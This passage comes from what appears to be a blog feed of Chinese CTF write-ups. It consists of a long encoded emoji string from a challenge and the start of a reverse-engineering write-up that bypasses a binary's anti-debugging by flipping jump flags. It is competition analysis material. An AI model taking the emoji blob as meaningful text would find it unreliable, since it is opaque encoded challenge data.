🐽👟👠👘👱👍👐👍🐽👛👱👄👍👅🐾👎👏👣👣👉👱👣👦👍👤👫👪👅🐽👌👰👅👎🐰👎👄👌👧🐧👍👍👟👢👎🐽👑👪👚🐼👫👘👍👍👧👏👍🐨👛🐾👉🐩🐽🐿👙🐽👟👊👘🐪🐸👱👍👤👯👢👛🐨🐼👰👌👏👟👘👊🐼🐬👧👌👤👯👮👍🐨👣👪👍👤🐽👏👉👣👁👎👍👎👫👢👎🐽👑👪👚🐽👟👑👍👎👈👮👍🐧👑👂👚🐩👅🐼👈👣👛👎👄🐩👟👈👍🐨👑👘👐👎👄👰👋👢👟👟👉👥🐹👆👐👤🐨👥👜👣👑👏👚🐼👛👢👄👌🐬👀👌🐩👫👦👘👍👁👩👅👍👣👍👙🐽 👑🐪👍👋🐽👘👛🐼🐨👀👑🐾👯👊👍🐽👑👁👍👎👯👦👙🐨👐👯👑🐼👟👟👉👤👯👘👐👣👟👅👜🐽👑👨👉👥👅👡👙🐿🐹👀👋🐨👛👮👘👍👁👪👎👏👧 👎👄👥👉👟👍🐻🐽👑👜🐽👅👬👋👣👉👠👉🐩👟👐👍🐽👛👮👍🐨👍🐾👎👢👍👊👙👌👑👩👍👤👫👘👜👣👛👩👎👥👛👎👄👍👣🐫👌👤👧👆👍🐩🐽👩👊👤👟👍👄👡🐽👊👑👍👑👊👚👣👛👫👘🐽👅👠👘🐧👧👈👍👣👚👮👄👍🐼👮👄👏👅👏👙👢👑👌👐👤🐬🐺👚🐨👍👫👚👱🐽👋👍👣👑🐧👑🐼👛🐾👘👍👁👩👚🐻🐹👎👍🐪👄🐨👍🐩🐨👂👍👍👁👬👎👣👧👟👘🐨👧👦👎👋🐽👘👉🐩👉🐾👊👥👅👘👉👋👍👦👑👎👯👑👄👣👐👯👌👢👅👎👄👢👣🐫👍👣👟👪👍🐾🐼👰👘🐽👛👑👘🐩👉👭👍👤👯👘👛🐾👍🐿👉👢🐬👅👍👥🐹👑👎👣👍👢👉🐩🐽👩👄👍👛👏👙👤👯👐👐👋👁👊👛👣👑🐿👜🐾🐽👎👍 👢👧👍👌👎👯👢👍🐨👁👎👚🐻👁👏👍🐪🐹👃👌👡👁👅👜🐽👉👬👋👤👟👊👙🐿🐹👮👍👤👧👂👙🐨👛🐾👑🐽👟👣👉👱👣👍👐👣👑👘👊🐽👐👯👘🐾👫👏👉🐧👧👁👌👎🐬👂👍👍👑👪👚🐻👅👘👍👣👧🐪👌👤👯👘👍👍👁👫👘🐽👛👟👄🐧🐽🐫👍👣👑👘👙🐩🐼👯👑🐼👟👋👘🐩👉👐👐👤👫👘👍👣👣👩👑🐽👅👊👄👏🐹🐽👌👍👟👦👍🐧🐨👏👌👥👣👌👙🐽👧👩👍👋👁🐽👜👣🐽👪👚🐽👛👠👍🐼👀👱👎👣👍👢👊👤👍👎👍👥👍👌👙🐾👟👐👌👡🐽👂 👎👣👛👏👜🐾🐰👍👄👍👧👏👍👤🐬🐾👌👤👁👍👎👣👍👑👘🐨👧👟👋👌👑👮👍👣👧🐽👑🐾👟👊👙🐿🐹🐬👎👎👫👊👌🐨👑👫👊👢👟👟👊🐼👧👏👐👎👫👮👋🐽👑👪👎👢👫👎👍👢👑👱👐🐧👛🐫👘🐼🐧👮👊👣🐽👎👄👥👟👏👎👍👛🐽👜👍👍👪👑🐽👛👠👘👱👍👎👎👎👯👢👅🐽👑🐾👌👣👛👎👙👤👉👏👐👢👑👪👅🐽👛👩👌👢👅👎👄🐻🐽👱👌👤👧👊👎🐾🐼👰👘🐽🐹👎👄🐾👉🐾👑👍👛🐾👊👍👉👪👎👤👟👟👜👣👑🐽👍👤👯👎👐👍👣👏👌👢👟👎👘🐩👯👍👐👏👧👪👍🐽👣👩👑🐻👅👅👍👣👧👀👑👌👑👘👋🐨👐👮👎👢👣👍👄👥👉👟👐👎👯👂👛🐾👍🐿👉👣👛👠👉👥🐸👱👎👢👛🐫👐 👎👅👎👋👥👁👘👉🐪🐹👦👑👎👯👘👎👍👑👩👐🐪👟👊👄👍👍🐫👌🐩👯👢👘👣👁🐾👚🐽👟👑👙🐾👟🐻👌🐧👑👢👍🐨👛👫👛🐽👟👊👘🐪🐹🐬👍🐩👫👢👙🐨👌👰👉👡👑👎👙👤👉👏👍👥👧🐹👜🐽👍👏👚🐪👟👡👄👎👉👑👐👌👑👦👘👍👀👯👊👤👟👎👙👏🐹🐻👍👡🐸🐨👉🐨👛👪👘🐼🐰👎👍🐾👯👑👍👎🐧👯👌🐨👅👎👚🐽👑👑👜👣👑👏👐👣👍👎👅🐽👐👰👚🐼🐰👎👄🐻🐽🐿👐🐧👑👊👍🐩🐽👩👎👥👁👘👉👣👧🐪👌🐧👛🐾👉🐨👉👫👙🐽👅👠👎🐽🐼👯👍👤🐨🐫👘👤👍🐽👄👌👑👅👍👎👟👋👐👤👫👮👋🐨👑👫👄👍👅👎👍👤👯👐👑🐼👛🐾👎🐽👁👪👚🐿👟👎👉👱🐸🐨👍👤👯👂👛🐾👍🐾👘🐽👛👅👙👣👀👱👎👎👫👘👊🐩👅👩👅👍👍👊👙🐾👟👦👋👍👟🐺👜👍👛👎👎👤🐽👟👄👌👣🐫👍🐾🐬👆👘👍👁👫👌👥🐹👎👘🐨👑👂👋👌👑👘 👚🐨👢👱👘🐽👛👅👍👎👮🐧👎👋🐹👎👚🐨👐👰👊👢👑👆👎🐼👁👎👐👢👛👦👉🐽👧🐼👉👤🐽👢👉🐨👑👀👌👤🐨🐧👋👤👁🐽👚🐻👑👎👘👢👦👮👐👋🐽👪👍🐨👉👩👙🐽👁👟👜👤👯👐👎👍👛🐧👐👎🐽🐾👚🐽👟👣👉👥🐹👪👌👡🐹👘👊👣👑🐿👜🐽👛👌👙🐽👧🐨👌👎👧👎👍🐨👀👱👘🐿🐽👌👙🐽 👧👟👍👡🐽👢👛👍👉👪👘🐾👟👟👜👣👑👏👍👤🐨🐫👐👎👈👰👉👢👛👏👎🐾👉👏👍👢👍👘👎🐽👣👩👎👢👫👣👙🐾👉👰👍👣👉🐾👘🐽👁👌👈👡 👅👍👄👥👈👮👍👡🐸👯👍🐩👅🐾👘🐽👛👟👘🐨👧👏👎👣👍👘👘🐩👄👰👉👢👛👍👙👎👟👆👐👢👍👮👅🐽👑👪👑🐿👛👋👄👢👣🐫👍🐨👟👦👍👤👁🐾👚🐾👟👍👙👏👄👯👍🐨👑👎👛🐾👍🐾👑🐼🐬👅👍👤👮🐨👎👢👍👊👈🐩🐽🐽👄👍👑👠👉🐼🐬👍👐👢👑👘👚👣👑👪👑🐼👫👊👄👢🐬👁👌🐩👯 👢👌🐧🐧👰👘🐾🐰👎👘👢👁👩👍👎🐨👎👛🐽👉👩👑🐾🐽👊👄👥👟👑👍👎👧👂👙🐨👑👪👎👥👅👟👊🐾👉👊👐👣👑👘👊🐽👑🐿👛🐾👫👎👉🐧👧👀👑👌👚🐬👍👤🐽👩👊👤👟👎👘🐨👧👟👐🐨👑👆👛🐼🐰👎👑🐾👣👊👄👌👧👘👍🐩👫👎👘🐧🐨🐿👉👣👑👅👎🐼👧👧👌👢👑👂👎🐽👣👪👌👣👛👎 👉👣👧👀👑👌👛🐾👋🐩👁👍👚🐼👣👍👙👏👟👩👐👍👑👘👉👣👑👐👑🐽👛👠👍🐼👌👮👍👤👧👂👌🐨👁👩👅👍👛👟👉🐪👉👋👐👢👑👮👛👣👛👪👑🐻🐹👑👍👤👉👏👎👢👑👦👘🐨👁👩👅👍👑👌👍👣👧👱👋👋🐽👊👍🐩🐽🐽👑🐽👛👅👘🐨👐🐩👎👍👍👢👉🐨👛👪👎👢👑👏👘👢🐬👏👌👣👑👮👄 🐨👍👫👜🐾👫👡👄👏🐹👀👑🐼👑👢👋👣👅🐽👊👢👫👎👙🐾👅🐫👋👢👑👉👜🐽👛👐👑🐼🐬👎👙🐿🐹👑👍👡🐹👦👈🐨👛🐾👙🐿👅👟👉👱👣👏👌👤👯👑👄👣👍👫👛🐻🐹👟👄👌👧👱👐🐧👉🐾👍🐨👀👱👘🐽🐹👑👍👤👉🐾👑👌👛👆👉🐩👅🐾👘🐽👛👅👄👌👧🐬👍👤👯👊👊🐨👈👯👊👏👟👏👙👣👑👋👐👢👌🐨👙🐨👉👎👘🐼👅👣👍👣👧🐿👍🐩🐨🐧👍👢🐨👏👌👢👟👎👄👥👟👭👐👋🐽👂👉👣👅👪👑🐽👍👎👍👢👧👀👍👡🐹👘👚🐩👅👪👍👥 👅👌👙🐾👉👆👍👣👚🐫👜👍👑👫👄👋👉👉👄👎👉🐿👍🐩🐬👆👘👣👁👐👌👤👟👎👙👋🐽👋👌🐧👑👎👛🐾👅🐭👍👣👛👅👍👥🐹🐭👍🐩👫👍👄👍👉👫👊👣👟👟👉👋👣👏👐👣👉🐾👄🐨👍👨👉👥👅👏👉👢👧👑👐👌👛🐾👌🐨👐👰👘🐽👣👏👍👣👁👃👐👡🐽👎👍🐨👛👬👌👤👫👋👉🐨👁👎👍🐽👑👘👛🐧🐨🐾👚🐼👑👟👉🐪👉👏👌👤👯👮👜👣👢👮👘🐿👛👏👉👤👉👁👌👎👫👦👍🐩🐼👯👍👡👉👎👄🐽👧👏👐🐩🐨👂👉🐨👛👩👅👎👣👠👉👏🐹🐩👍👡🐽👘👘🐧🐬🐾👌👏👟👋👙👢👧👇👍👤🐨👊👙🐨👍👫👅👌👅👡👉👣👑👯👌🐩🐧🐬👍🐨👑👪👚🐼👟👎👍🐪👉👩👐👋🐸👯👍🐩👁🐼👌👣👟👟👄 👤👟👌👎👍👉🐾👊👤👍👪👉👥👍👉👙🐽👧👦👐👋🐽👮👋👍👑🐿👄👋👉👑👍🐧🐬👱👐🐧👍👎👍👤👁👏👜🐼🐰👎👙👏👟👘👋👍👑👘👎🐾👍🐿👆👎 👧👅👘🐨👐🐨👍👤🐧🐨👊🐨👛🐿👊👢👟👣👉👤👟👘👐👢👛👦👛👣👣👍👎👥👅👎👙🐾👉🐨👎👢👑👆👍🐩🐼👱👈👏👛👏👘🐨👑👟👍🐻🐽👊👚🐨 👛👐👘🐽👉👟👙🐼👧👐👎👍👛🐧👛👢🐨🐾👍👡👑👊👙👏👉👋👋👍👌🐨👎👣👣👩👑🐾🐰👍👄👢👧👐👐👌👑👪👎🐽👐👱👘🐿👑👎👍🐼👑👩👌👡 🐽👮👉🐨👧🐿👉👣👅👎👉🐪👟🐫👍👢👑👘👐👎👈👮👄👍👛👎👙👣👁👪👌👣👉👪👙🐨👑👫👛🐿👅👆👉👣👍🐬👋👣👚🐬👍🐧🐨👍👚🐻🐹👎👍👤👟 👩👍🐧👑👘👚🐩👅🐽👛🐾🐽👎👍👥🐹👐👍👡🐽👢👉🐨👀👰👉👢👟👠👉👤👟👋👐👋👅🐹👜👍👑👫👜🐾👫👢👄👌👣🐫👐👢👑👦👍🐩👁👩👅👍👣 👎👄🐾👈🐧👐👱🐽👎👚🐨👧🐾👋👣👟👊👙🐼👧👑👎👢👍👘👘🐨👈👯👊👥👉👢👉🐼🐬👐👐👋👁👅👄👍👐👮👎👢👫👡👄👢🐬🐽👌👎👯👢👍🐧🐧 👰👘🐽🐽👎👄👍👧👟👎👍👛👅👜👍👉👩👘🐾👟👊👙👢👁👇👎👎🐧👯👙👤👍👪👎👣👟👡👉👎👉👩👋👍👍👪👅👍👍👫👛🐾👫👎👍🐧👐🐩👍👤👪 🐬👎👤👁🐿👌👥🐽👘👍👍👧👟👑🐼👌👯👍👍👍👫👘🐼🐬👠👉👍👢👮👍👣👛🐫👙🐩👀👰👉👣👛👋👙👣👁👦👌👤👯👮👐👍👑👩👍👥👛👎👉👣👣🐪 👍🐩🐬👆👘🐨👀👯👎👢👛👘👉👎👉🐪👍🐾👯👘👚🐨👛👐👚🐽👛👅👙👣👁👦👍👢👉👂👉🐩👅👩👄👍👛👟👉🐪👟👌👌👡👅👦👎👍👑🐾👐👱🐽👠 👄👢🐬👱👍🐩👫👎👌🐩👁👍👎👥👁👎👙👏👉👟👑👎👯👢👚👣👛👬👑🐽👛👅👍👤👮🐧👍👎🐨👮👋🐨👐👰👉👥👁👋👙👎👟👎👋👎👧🐾👌🐨👧👎👎 👣👅👡👙🐾👉🐧👐👌👑👆👘👎🐼👮👚🐽🐽👎👙🐾👅🐪👋👍👑🐽👛🐧🐨👐👋👣👟👠👘🐨👧👍👎👎🐧🐨👈🐩👄👯👍👥👉👡👜👢👑👌👍👤👯👘👄🐽👧🐽👑🐼👛👟👍👢👧👰👐🐧👉🐺👍🐨👑🐭👈👋🐽👎👄👥👟👟👌👤👪🐨👍👣👍👪👎👢🐬👎👙👢👁🐬👍👤🐨🐫👐👍👈👰👋👣👛👎👙👣👁👦👌👣👉👎👙🐨👧👏👜🐽👛👅👄👍👧🐧👋👌👟👦👋👣👀👮👍👡👉👑👘🐨👧👩👍👢👑👢👊🐾👍🐿👆👍👑👠👙👢👁🐭👍👤🐨🐫👐👎👅👪👎👥👁👢👉👣👑 👋👐👢👟🐺👎👣👛👪👍👤👫👊👄👢👑👰👋👍👑👪👌👤🐼👱👈👣👣👑👍🐼👑🐪👍👌👑👘👊🐾👍🐿👉👤👫👊👄👌👢👰👍👎🐨🐫👘🐩🐽🐽👄👍👣 👉👘👢👧👐👍🐧👟🐺👊🐽👑👫👄👍👛👎👄👌🐬👱👐👢👛👪👌🐧🐨👫👘🐽👑👎👍🐪👟👏👑🐻🐽👢👉🐨👧🐾👘🐾👯👊👜👤👯👎👎👎👯👘👐👍👅🐾👙🐽👍👌👙👏👉👐👌👡🐹👮👊🐽👢👮👘🐼👫👎👍👣👧👱👐🐧👉👆👐👍👑👪👚🐻👅👍👙👏👟👟👍👣👑👂👛🐾🐽🐾👑🐾👟👅👄🐼👐🐧👍👤👯👘👘🐩👈👯👍👏👟👏👎🐾👟👐👐👋🐽👮👚👍👍👩👍👋🐽👎👄👍👧👰👍👤🐨🐾👘🐽👁👫👛🐻👍👑👜👢🐬👭👍👡🐸👯👎🐽👍👨👈👣👧👟👄👏🐹 👈👍👣👉👂👉👤👍👪👉👥👅👡👉👤👉👧👌👡🐸🐧👜👣👛👪👍👤👫👋👙👍👑👏👍🐩🐬👎👍👎👁🐿👘🐿🐹👑👎🐿🐹👏👍🐩👯👢👎🐾👍🐿👆👍👑👅👍 👥🐹👐👍👤🐧🐨👉🐨👌👰👊👣👑👏👙🐽👑👎👐👣👟👦👜👣👉👪👎👥👛👎👙👌👑👀👑🐼👑👢👋👣👁🐽👎👣👟👏👍🐼👁👟👐👡🐽👢👛🐽👁👬👊👢 🐰👎👉👋👍👐👍🐽👍👘👛🐨👣👎👚🐽👟👣👉👎👉👨👐👣👍👘👊🐽👛👩👑🐾🐰👟👉👋🐹🐪👌🐩👯👂👍🐩👁👌👉👡👅👍👘👢👑👘👑👍👑👎👚🐨 👧🐾👍👤👣👟👜👣👑👑👍🐨👛🐫👘🐧🐬🐾👎👢👛👍👙🐾👉👏👐👤🐨👊👎🐽👣👩👎👥👅👆👉👤👉👰👍👎👯👆👘🐽👑👌👉👥👣👑👘🐨👁👇👍👣 👛👂👉🐩👅👀👊👣👛👅👉🐨👁👄👎👏👧🐾👋🐩👅👩👆👍👛👏👙👎👟👆👍👤🐬🐺👛👣👐👯👑🐿👛👊👄👍👍🐫👍🐨👟👦👐👍👅🐾👎👣👑👑👎🐿🐹 👱👍👢👑👪👚👣👧🐼👋👢🐬👎👙🐿🐹👁👎👣👍👘👐👍👈👯👎👏👛👏👘🐩👯👎👋👎🐬👊👘🐽👣👏👜🐼👫👏👉👣👑👱👎👢👑👎👍🐧🐧👮👊👢👣👏👘🐩👈🐧👎👍👛👊👉👢🐨👎👎👤👫👊👙🐼👧👌👎👎👫👘👛🐧🐬👪👎👥👅👘👉🐽👁👘👍👤👯👂👜👣👌👰👅👍👛👍👙👌👧👐👐👌👑👪👎👤🐼👯 👚🐻👅👑👄👥👟👟👐🐨👑👂👚👢🐰👎👋👢🐬👎👍🐽👍🐫👍👤👯👡👜🐼🐨🐾👍👏👣👊👘👣👧👏👐👤🐨👊👎🐽👑👬👚🐼👁👣👉👣👑👐👐👱👅👦 👍🐧🐨👏👌👣👧👑👍👍👧👭👐👍👑👁👜🐽👅👫👘🐽👛👠👎🐼👁🐼👍👤👧🐹👄👍👀👯👑🐿👅👟👉👋👣👏👐👏👧👎👎🐽👑🐾👑🐻🐹👢👄👣👑👏👍 👎🐬👆👎🐾👁👩👅👍👣👑👙🐽👑👏👋👢👑👩👛🐨👧🐿👆👍👛👅👉🐼👑👀👎👋🐹👦👛🐨👐👰👊👢👛👡👉👢👁👘👑👎👫👘👌🐽👢👰👚👱🐽👎👄👍👁🐧👐👢👑👆👘👍👛🐾👉👏👟👎👙👋🐼🐧👐👎🐨👎👉👢🐨👍👎👢🐬👎👍🐩👟👌👎👎🐨🐧👛🐨👈👯👎👥👉👅👍🐽👁👎👋👍👛🐫👍👣👑🐿👛🐼🐰👏👉👢👧🐧👑👌👟👮👎👣👑👏👋👋🐽👎👘👢👑👃👑🐼👛👎👉🐩🐽🐾👑🐼🐬👠👙🐼👐👱👍🐨👑👢👜👤👍🐿👋👥👁👆👍👣👧👦👌👤🐬🐺👙🐨👉👎👘🐼👅👅👙🐽👧🐧👐🐧👍👂👘🐧🐨👪👎👢👟👎👉👱👍🐿👍👢👛👂👊🐽👍👪👘🐽👧👟👄👍👦👱👍👎👫👘👐👍👀👯👑🐿👉👢👉👣👑👧👍👤👯👮👊👍👛👌👈👣👛👡👄👍👧👀👌🐩👯👦👘🐽👁👪👊👣👑👎👘🐨👑🐪👑🐾👯👘👚🐨👛👫👉👣👅👅👍👥🐸👮👍👎🐧👯👄🐽👉👫👉👏👟👡👉👎👯👏👐👎 👫👩👜🐽👑👌👉👣👅👡👄👍👁👰👐👌👛👦👌🐩👁👎👊👣👛👎👙👋🐼🐧👎👍👛👎👚🐨👍👬👊👣👟👠👍👍👧👑👍👎👯👊👍🐨👐👯👌👏👟👏👙👋👣👎👋👌👉🐾👊👣👍👏👜🐾🐰👎👄👢👑👰👐👥👧🐺👎👣👑🐽👎👤👟👘👉👍👧👇👐👱👁👂👊🐾🐽🐾👋👣👅👎👉👣👧👐👍👤🐧👯👅🐽👣👏👌👏👣 👊👘🐩👉👐👍🐧👛👊👎🐽👑👩👍👤🐽👏👉👤👯👰👍🐩👫🐧👙🐾👁🐿👌👥👣👎👙🐽👁🐿👐👌👑👂👍👍🐽👨👋👣👑👅👙👣🐽🐪👍👤👧🐹👜🐽👐👰👋👢👛👟👉👤👉👦👐👋🐽👮👎🐽👛👪👍👤🐽👟👄👢🐨🐬👌👤👫👢👍👤👁👏👘🐼🐰👑👘🐨👑🐪👋👢👑👘👚🐨👧👀👑🐽👉👅👘🐩👮🐧👍👡🐽👦👙 🐨👑👫👊👢👛👡👉🐩👟👎👐👣👟👅👜🐽👐👯👎👣👛👢👉🐨👑🐿👎👢👌🐨👋👣👑👫👛👱🐽👏👘🐨👑👋👌👋👁🐾👉👢🐨👎👎👤👣👊👉👋👍👎👎👎👫👘👐👎👅👪👎👥👅👘👉👏👉👋👋👎👪🐨👊👣👌👰👜🐾👫👍👄🐻🐹🐬👐👌👚🐬👍🐩🐽👩👊👥👁👎👍👱🐽👏👑🐼👑👊👚👣👧🐿👉👣👅👅👙👤👟👘👍👣👛👮👊🐩👀👯👎👥👅👏👙👢🐬👦👌🐧👛👊👌🐨👣👪👎👤🐽👋👉👣👧👀👑🐼👛🐧👍🐨👐👮👚🐼👣👘👍👎👟🐻👍👤🐨👂👎👍👉👐👘🐽👧👟👘🐨👧👌👍👡🐹👢👍🐨👁👫👌👢👛👘👉🐩👯👋👋👍👍👮👐👍👑👩👎👤🐽👠👄👣🐽🐫👍👎🐬👆👎🐾👁👩👅👏🐽👍👙👋🐽👭👎👍👑👪👍👍👅👫👆👍👑👊👙🐿🐹🐫👍👋👁🐧👄🐽👐👰👊👢👟👍👙👥🐹👘👍👣👑👮👄🐨👣👍👍👏👟👏👍👢👑👑👐🐧👑👢👌🐩👁🐾👚🐾🐰👏👘🐨👁🐿👎👍👛👊👉🐨 👅👬👊👤👟👊👄🐨👁👌👎👎👫👘👛🐩👉👪👑🐿👅👘👉🐼👁👘👍👤🐨👊👜👣👛👩👘🐼🐰👎👄👢👧👎👍🐩🐧🐬👍👍👑👪👚🐿👧👌👍🐼👑👋👍👡👁🐾 👉👣👧🐾👑🐼🐬👟👄🐧👀🐨👍🐨👉🐺👐👎👀👯👎👏👣👊👎🐾👟👐👐👎👪🐨👎🐽👍👪👎👥👛👎👄👏🐹👎👍🐩🐨🐧👘👤👁👀👈👢👣👑👄🐾👉👱 👍👢👑👂👍👤👅🐽👚🐽👛👠👍🐼👀🐧👎👣👛👱👜🐽👐👯👑🐽👣👠👉👣👁👦👋👎👯👂👎👍👛👎👑🐻👉👋👄👎👉🐿👍👎👯👢👎🐾👁👫👌👤🐰👍👙 👋🐽👋👍🐧👑👑👜👎👅🐭👉👤👣👊👘🐪🐸👯👍👍👛🐧👙🐨👛🐿👉👏👟👡👉👢👁👘👍👤🐨👊👉🐨👧👍👑🐼🐰👊👄👢🐬🐿👐👌👑👢👋👢🐨👍👚🐻 👍👎👄👎👉🐪👌👡👁🐽👜🐽👅👐👙🐽👉👟👄👥👟👍👎👎👫👢👙🐩👅🐾👙🐿👅👏👘🐪👉👪👐👢👑👮👄🐽👉👍👘🐾🐰👎👘👱🐽👐👍👎🐬👮👎👣👑🐽👅👏👁👎👘👢👧👃👍🐨👑👎👚🐩🐽🐾👍👣👛👅👄👌👣🐭👍👤👧🐺👐👍👐👰👌👢👟👌👘🐨👧👈👍👤🐨👊👎🐽👣👩👘🐼👅👆👙🐾👉👍👌👎🐧 🐬👍🐼🐨👎👙🐻👅👌👍👣👑👭👍👤🐨🐽👜👤🐽🐾👘🐽👍👎👍🐨👁👌👍👡🐹👘👍👤👍🐾👑🐿👅👌👙👏🐹👆👐👏👧👎👊👍👐👰👛🐾🐽👌👄👍👣🐬👌🐩👯👎👘🐾👍👩👚🐽👟👑👙🐽👁🐿👋👋🐽👎👚👍👁👬👋👣👟👊👘🐪🐹👘👎👍👍👢👉🐨👌👯👎👏👣👟👉👤👯👐👍👤👯👂👋🐽👣👨👉👣👛👎👄 👎👉🐨👍👎🐨🐧👍🐽👀👯👊👣👛👎👉👣👧👟👑🐻🐸👯👉🐩👅🐽👎👤👟👊👄🐨👁👐👍👎🐨🐫👛🐩👍👪👘🐪👛👟👊🐾👉👐👌👡🐹👎👅🐽👌👰👜 🐽👅👎👄🐻🐽🐨👐👌👛👦👐👍👁👏👌👣👟👍👘👢👧🐿👌👡🐽👢👚👢🐬👏👙🐾👣👎👄👤👚👯👍👤👧🐾👐👎🐼👮👅👌👛👍👎🐾👟👌👐👤👫👮👌🐽👑👫👄👍👅👟👉👣👑🐧👋👣👍👆👘👣👁👪👎👡🐹👘👉👎👟👩👍👢👑👘👚🐩👅🐼👈👤🐽👊👍🐨👁👀👍👡🐹👢👊🐨👐👯👑🐿👅👠👉👤👉👧👍🐧👑 👂👅👣👑👫👜🐾👫👋👄👎👉👏👌👤🐬👎👌👤👁🐾👚🐾🐰👑👍🐼👑🐪👍🐽👑👘👊🐼🐨👌👌👣👧👎👄🐻👍🐭👎👍👉👆👛🐩🐽🐾👊👏👣👣👉👋👣 👏👐👣👟👦👐👍👉👍👎👤🐽👡👍👢🐬👯👌👎👯👮👍🐩👁👎👊👢👧👎👍👱🐸👯👍🐻👁🐾👚🐨👅👬👌👤👟👊👙👎👟👟👍👤👫👎👐👎🐽🐾👚🐽👛👏👙👤👉👏👐👢👛👊👄👍👑🐿👄👏👛👎👄👢👍🐭👌👎👧👘👎🐽👑🐽👊👥👁👌👘🐨👧👎👑👍👑👆👚🐨👧🐾👌👤👣👎👍👥🐹👘👍👤🐨🐧👍🐨👄👰👋👥👅👠👊🐼👑👋👐👢👑👮👚👣👉👍👌👢👛👏👙🐽👧👐👋👍👚🐬👍👢🐨👪👎👡🐹👘👍👍👧👱👍👡👁👂👎👍🐽👪👈👣👛👎👉👍👧👰👍👎👧🐾👛 🐨👀👯👚🐼👛👟👉🐩👯👦👑👎👯👘👎👣👑👩👎👤👫👣👘👱🐽👏👍🐾👫👢👎🐽👛🐿👜🐿👅👍👙👥🐹👱👐👡🐽👘👛🐼🐨👎👋👣👉👊👙🐽👐🐨👍🐾👯👦👋🐨👐👮👄👏👁👡👉👣👧👎👐👢👑👂👉🐽👐👮👎👤🐽👡👄👍👧👯👍👎👯👘👘🐾🐼👱👈👣🐽👎👍🐪🐹🐿👐👋👁👅👜👍👁👩👘🐾👟👊👄🐩👟👮👍👡🐹👢👙🐩🐽🐾👎👥👉👣👉🐪🐹👪👌👣👉🐾👊👍👑👎👘🐿👅👎👄👢👧👀👍👎🐧🐬👍👍👑🐽👚🐽👉👎👄👍👧👱👑🐼👌👯👍🐨👉👪👘🐽👅👠 👉👏🐹👘👍🐩👫👎👐👎🐼👯👌👏👟👋👙👣👁👩👌👢👌🐨👎👍👣👌👊👢🐬👅👍👣👣🐪👍🐩👫🐧👘👢🐨👩👅👌👧👑👄🐽👧🐪👍🐾👯👁👜👍👦👱👚🐽👛👠👎🐼👁👄👍👎👧👂👋🐩👄👯👚🐼👣👌👙🐽👧👧👌🐧👍👂👌🐽👛👏👄🐿👟👠👙👍👑👱👍🐩👯👦👘👣👁👏👌👥👁👌👍👣👌👯👌🐨👑👍👜👎👉🐿👆👎👟👊👘🐩👮🐩👎👍👍👦👈🐨👑👫👊👣👍👎👘🐨👁👐👍👤👯👮👘🐽👧🐽👑🐼🐰👊👙🐿🐹👀👐👌👛👪👍🐩👁👀👈👢👫👎👙👋🐹🐪👋👍👑👅👜🐽👍👬👋👣👟👠👙🐼👧👏👎👎👫👢👅🐽👛🐾👌👣👑👘👉👢🐬👩👐👢👑👪👅🐽👐👰👅👌🐰👟👄👌👣🐫👍🐩👫👢👐👍👁👏👌👡👅👎👉🐪👟👟👐 👱👁👆👉👍👍👪👑🐽👛👠👍👋👈👮👍👣👛👮👉🐩🐼👯👊👏👟👌👙👣👑👎👐👣👟👦👍👍👍👨👋👤🐰👏👍👣👧🐿👎👏👧🐾👍👤👁👎👉👡👉👎👄👡 👍🐿👍👎👯👢👊🐾🐽🐾👘🐽👍👎👄🐧🐨🐫👍👋🐹👘👚🐩👅👪👑🐿👅👘👉🐩👟👏👐👋👅🐺👅👣👛👏👛🐽👅👌👄👍👣🐬👌🐩👯👎👌🐨👑🐽👊👣👣👎👙👋🐽👋👍🐻🐽👮👍👣👛👬👑🐽👉👎👙🐼👧🐭👎👍👍👢👚🐨👌👰👊👢👣👉👙🐿🐹👏👐👣👉🐺👅🐽👉👍👑🐽👁👢👄🐻👍👏👎👢👑👦👘👍👁👬 👈👣👧👏👍👣👁🐿👑🐻🐽👎👍🐨👛👬👌👤👫👊👎🐽👁👏👍🐽👑👘👐👍👅🐾👎👣👛👟👉🐪👉👎👍👤👯👘👍👣👉👍👌👥👁👈👌👋🐧🐰"</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/11/14/2023%E5%B1%B1%E4%B8%9C%E7%9C%81%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9BWriteUp/12.png" alt="img"></p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023强网拟态初赛WriteUp</title>
      <link href="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/"/>
      <url>/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>尽力了，呼呼呼</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/image-20231113101756324.png" alt="image-20231113101756324"></p><h1 id="fisher-sha1-x2F-反调试"><a href="#fisher-sha1-x2F-反调试" class="headerlink" title="fisher - sha1/反调试"></a>fisher - sha1/反调试</h1><ul><li>sha1</li><li>反调试</li></ul><p>下载附件运行无果</p><p>OK，没思路就动调，找输入的地方下断点</p><p>有几个反调试</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps1.jpg" alt="img"> </p><p>遇到jz/jnz的指令，改标志位直接过</p><p>（通常过反调试的方法，那就是运行，退出程序的前几条指令修改即可）</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps2.jpg" alt="img"> </p><p>然后会到输入的地方</p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps3.jpg" alt="img"> </p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps4.jpg" alt="img"> </p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps5.jpg" alt="img"> </p><p><img src="/2023/11/13/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9BWriteUp/wps6.jpg" alt="img"> 